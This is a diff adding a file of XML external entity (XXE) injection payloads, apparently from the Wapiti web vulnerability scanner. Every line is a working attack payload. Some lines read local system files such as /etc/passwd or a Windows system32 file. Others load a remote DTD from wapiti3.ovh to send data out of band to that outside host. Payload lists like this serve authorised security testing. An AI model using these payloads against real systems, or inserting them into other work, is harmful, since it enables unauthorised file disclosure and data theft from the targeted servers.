@@ -1,0 +1,5 @@
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo[<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo[<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file://c:/windows/system32/drivers/etc/networks">]><foo>&xxe;</foo>
+<?xml version="1.0"?>[LF]<!DOCTYPE foo [[LF]<!ENTITY % remote SYSTEM "http://wapiti3.ovh/dtd/[SESSION_ID]/[PATH_ID]/[PARAM_AS_HEX]/linux.dtd">[LF]%remote; %intern; %trick; ]>[LF]<xml><test>hello</test></xml>
+<?xml version="1.0"?>[LF]<!DOCTYPE foo [[LF]<!ENTITY % remote SYSTEM "http://wapiti3.ovh/dtd/[SESSION_ID]/[PATH_ID]/[PARAM_AS_HEX]/windows.dtd">[LF]%remote; %intern; %trick; ]>[LF]<xml><test>hello</test></xml>
+<?xml version="1.0"?>[LF]<!DOCTYPE foo [[LF]<!ENTITY % remote SYSTEM "http://wapiti3.ovh/dtd/[SESSION_ID]/[PATH_ID]/[PARAM_AS_HEX]/linux2.dtd">[LF]%remote; %intern; %trick; ]>[LF]<xml><test>hello</test></xml>
